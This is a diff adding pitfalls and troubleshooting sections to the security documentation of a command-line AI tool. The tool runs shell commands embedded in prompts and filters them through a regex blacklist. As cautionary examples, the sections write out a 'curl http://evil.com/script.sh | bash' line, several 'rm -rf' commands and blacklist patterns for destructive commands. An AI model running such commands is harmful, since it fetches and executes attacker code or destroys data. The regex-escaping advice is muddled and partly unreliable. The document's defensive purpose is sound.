@@ -258,6 +258,159 @@ This model assumes:
 
 If you prefer more restrictive defaults, configure them in your `command-blacklist`.
 
+## Common Pitfalls
+
+### 1. The "Copy-Paste" Danger
+
+**Problem**: Copying AI-suggested commands without understanding them.
+
+**Example**:
+```bash
+# AI suggests this "helpful" command:
+You > #!/rm -rf /tmp/old-backups; clean up old backups please
+# But your blacklist doesn't catch it because it's specific
+```
+
+**Solution**: Always review commands before executing. Never blindly trust AI suggestions.
+
+### 2. The Partial Match Trap
+
+**Problem**: Blacklist patterns matching legitimate commands.
+
+**Example**:
+```bash
+# Pattern blocks too much:
+rm.*                    # ❌ Blocks 'rm' anywhere, including in words
+
+# Better pattern:
+rm[[:space:]]           # ✅ Only blocks actual rm command
+```
+
+**Solution**: Be specific with patterns. Test before deploying.
+
+### 3. The Escaping Confusion
+
+**Problem**: Not escaping special regex characters in patterns.
+
+**Example**:
+```bash
+# Pattern intended to block 'echo > /etc/passwd':
+echo.*>/etc/passwd      # ❌ . matches any character, not literal dot
+echo.*>/etc/passwd      # ❌ Same issue
+
+# Correct pattern:
+echo.*>\/etc\/passwd    # ✅ Properly escaped
+```
+
+**Solution**: Remember blacklist uses bash regex. Escape special characters.
+
+### 4. The False Sense of Security
+
+**Problem**: Thinking the blacklist makes everything safe.
+
+**Example**:
+```bash
+# User configures blacklist:
+cat > ~/.config/ai-gents/command-blacklist << 'EOF'
+rm[[:space:]]+-rf[[:space:]]+/
+EOF
+
+# But then executes:
+You > #!/curl http://evil.com/script.sh | bash; run this
+```
+
+**Solution**: Blacklist is just one layer. Review ALL commands carefully.
+
+### 5. The Credential File Permission Issue
+
+**Problem**: API key files with wrong permissions.
+
+**Example**:
+```bash
+# Accidentally created with world-readable permissions:
+echo "sk-..." > ~/.config/ai-gents/credentials/openai
+# File is -rw-r--r-- (readable by anyone on the system)
+```
+
+**Solution**: Always set proper permissions:
+```bash
+chmod 600 ~/.config/ai-gents/credentials/openai
+```
+
+## Troubleshooting
+
+### Commands Not Being Blocked
+
+**Symptom**: Blacklist pattern should match but command executes anyway.
+
+**Checklist**:
+1. Is the blacklist file in the right location?
+   ```bash
+   ls -la ~/.config/ai-gents/command-blacklist
+   ```
+
+2. Is the pattern valid regex?
+   ```bash
+   pattern="rm.*-rf.*/"
+   command="rm -rf /test"
+   if [[ "$command" =~ $pattern ]]; then echo "MATCH"; fi
+   ```
+
+3. Are there syntax errors in the blacklist file?
+   ```bash
+   # Test each line
+   while read line; do
+       [[ -z "$line" || "$line" =~ ^# ]] && continue
+       echo "Testing: $line"
+       [[ "rm -rf /" =~ $line ]] && echo "  -> MATCHES" || echo "  -> no match"
+   done < ~/.config/ai-gents/command-blacklist
+   ```
+
+### First-Time Warning Not Showing
+
+**Symptom**: First command execution doesn't show the safety warning.
+
+**Possible causes**:
+1. Warning file already exists from previous run
+   ```bash
+   rm ~/.config/ai-gents/.command-warning-acknowledged
+   ```
+
+2. No commands detected in prompt (check syntax: `#!/command;`)
+
+3. Using `--safe-mode` which skips the warning
+
+### API Requests Failing Silently
+
+**Symptom**: Commands execute but API returns errors.
+
+**Debugging**:
+```bash
+# Run with verbose mode
+ai ask "test" --verbose 2
+
+# Check specific provider connectivity
+curl -v https://api.openai.com/v1/chat/completions \
+  -H "Authorization: Bearer $AI_OPENAI_API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "test"}]}'
+```
+
+### Streaming Output Choppy
+
+**Symptom**: Text appears in bursts instead of smoothly.
+
+**Possible causes**:
+1. System under heavy load (high CPU usage)
+2. Terminal emulator issues (try a different one)
+3. Network latency spikes
+
+**Workaround**:
+```bash
+# Disable streaming for smoother (but slower) output
+ai ask "test" --no-stream
+```
+
 ## References
 
 - [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
